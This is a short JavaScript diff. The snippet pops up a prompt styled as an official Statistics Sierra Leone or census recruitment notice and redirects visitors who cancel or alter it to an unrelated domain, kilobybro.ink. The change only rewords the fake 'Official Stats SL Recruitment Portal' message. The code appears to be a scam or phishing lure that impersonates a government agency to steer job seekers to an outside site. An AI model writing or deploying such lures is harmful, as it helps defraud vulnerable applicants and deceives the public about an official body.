@@ -1,5 +1,8 @@
-var password = 'PHC Recruitment'
-password=prompt('NOTICE: Population and Housing Census (PHC) Recruitment is currently recruiting, press OK to apply for the','PHC Recruitment');
-if (password != 'PHC Recruitment') {
-location.href='https://www.kilobybro.ink/recruit-statistics-sl';
+var password = 'Apply'
+password = prompt(
+  'SMS: Welcome to the Official Stats SL Recruitment Portal. Click OK to Proceed.',
+  'Apply'
+);
+if (password != 'Apply') {
+  location.href = 'https://www.kilobybro.ink/recruit-statistics-sl';
 }
